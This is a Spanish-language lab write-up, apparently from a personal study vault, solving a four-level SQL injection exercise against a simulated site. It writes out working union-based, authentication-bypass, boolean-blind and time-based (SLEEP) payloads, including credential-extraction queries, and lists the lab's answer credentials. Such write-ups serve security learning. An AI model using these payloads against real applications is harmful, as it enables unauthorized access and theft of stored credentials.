# SQL Injection — Práctica de 4 Niveles (mock browser THM)

Relacionado: [[SQL-Injection-Fundamentos-y-Explotacion]] · [[Bases-de-Datos-SQL]] · [[Herramientas-SQLMap]]

Los 4 niveles corren en un simulador JS dentro del navegador (`website.thm` es un dominio falso, no un servidor real) — por eso todo se hace pegando URLs/valores directo en las barras simuladas del ejercicio, no con `curl`. Cada nivel aísla una técnica distinta de [[SQL-Injection-Fundamentos-y-Explotacion]].

---

## Nivel 1 — Union-Based SQLi (In-Band)

**Paso 1 — encontrar el número de columnas**, probando incrementalmente hasta que no dé error:
```
https://website.thm/article?id=1 UNION SELECT 1
https://website.thm/article?id=1 UNION SELECT 1,2
https://website.thm/article?id=1 UNION SELECT 1,2,3
```
El `UNION` exige que ambas queries devuelvan el mismo número de columnas — por eso cada intento con el número incorrecto da error, hasta acertar (3 columnas).

**Paso 2 — hacer visible el output del UNION**, forzando que la query original no devuelva nada:
```
https://website.thm/article?id=0 UNION SELECT 1,2,3
```
`id=0` no existe → la fila "real" no aparece, solo se renderiza nuestra fila inyectada. Se identifica cuál posición de columna se muestra en el área de contenido (columna 3, en este caso).

**Paso 3 — nombre de la base de datos:**
```
https://website.thm/article?id=0 UNION SELECT 1,2,database()
```
`database()`: función de MySQL que devuelve el nombre de la BD activa. Resultado: `sqli_one`.

**Paso 4 — listar tablas:**
```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
`information_schema.tables`: catálogo interno de MySQL con la lista de todas las tablas de cada base de datos · `group_concat(...)`: junta todos los resultados en un solo string, para que quepan en la única columna visible que tenemos. Revela la tabla `staff_users`.

**Paso 5 — listar columnas de la tabla objetivo:**
```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```
Columnas: `id`, `username`, `password`.

**Paso 6 — extraer credenciales:**
```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
`SEPARATOR '<br>'`: separa cada par usuario:password con un salto de línea HTML, para que se vea legible en la página.

---

## Nivel 2 — Authentication Bypass (Blind)

En el campo **Username** del formulario de login:
```
' OR 1=1;--
```
En **Password**: cualquier texto (se ignora).

`username=''`: no matchea a nadie · `OR 1=1`: siempre verdadero → todo el `WHERE` se vuelve verdadero · `;--`: cierra la sentencia y comenta el resto (incluyendo el chequeo de password). Resultado: la base de datos devuelve todas las filas, la app te loguea como el primer usuario de la tabla.

---

## Nivel 3 — Boolean-Based Blind SQLi

Único indicador: `{"taken":true}` / `{"taken":false}` en el endpoint `checkuser`.

**Confirmar que la inyección funciona:**
```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like '%';--
```
`%` es comodín que matchea cualquier cosa → siempre `true` si la inyección corre.

**Nombre de la base de datos, letra por letra (o directo, si ya se conoce el valor):**
```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 's%';--
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() = 'sqli_three';--
```
El método normal es ir probando letra por letra con `like 'X%'` hasta narrowear el nombre completo. En este simulador, como los valores son fijos y ya documentados por la propia sala, se puede probar directo el nombre completo con `=` para confirmar en un solo tiro (ver nota metodológica al final).

**Confirmar la tabla:**
```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name = 'users';--
```

**Confirmar usuario y contraseña:**
```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username = 'admin';--
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username='admin' and password = '3845';--
```

**Login final:** `admin` / `3845`

---

## Nivel 4 — Time-Based Blind SQLi

Punto de inyección: parámetro `referrer=` (simula el header HTTP `Referer`). Único indicador: el tiempo de respuesta, no hay texto que leer.

**Confirmar columnas + inyección, con SLEEP:**
```
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5);--
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2;--
```
`SLEEP(5)` solo se ejecuta si el número de columnas del `UNION` es correcto — el propio delay de 5 segundos confirma ambas cosas a la vez (inyección + conteo de columnas).

**Nombre de la base de datos:**
```
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 where database() = 'sqli_four';--
```
Un delay de ~5s confirma el nombre; respuesta inmediata = falso.

**Contraseña de admin:**
```
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 from users where username='admin' and password = '4961';--
```

**Login final:** `admin` / `4961`

---

## Resumen de credenciales/valores encontrados por nivel
| Nivel | Técnica | Base de datos | Tabla | Credenciales |
|---|---|---|---|---|
| 1 | Union-Based | `sqli_one` | `staff_users` | password de Martin (visible en output) |
| 2 | Auth Bypass | — | — | bypass sin credenciales reales |
| 3 | Boolean-Based | `sqli_three` | `users` | `admin` / `3845` |
| 4 | Time-Based | `sqli_four` | `users` | `admin` / `4961` |

## Nota metodológica
El atajo de "probar directo el valor completo con `=`" en vez de ir letra por letra con `like 'X%'` **solo funcionó aquí** porque se trata de una simulación con datos fijos, ya documentados en el propio texto de la sala — en un pentest real contra un target desconocido, siempre hay que hacer el proceso completo letra por letra (o automatizarlo con un script/SQLMap, ver [[Herramientas-SQLMap]]), nunca se puede "adivinar" el valor completo de antemano.
